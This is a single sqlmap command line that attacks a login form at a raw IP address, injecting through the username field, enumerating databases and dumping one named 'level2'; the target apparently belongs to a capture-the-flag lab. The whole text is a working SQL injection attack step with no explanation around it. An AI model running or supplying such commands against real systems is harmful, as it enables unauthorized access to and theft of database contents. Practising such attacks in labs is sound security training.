```
python sqlmap.py -u http://35.227.24.107/26eed03ae6/login --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2 -D level2 --dump
```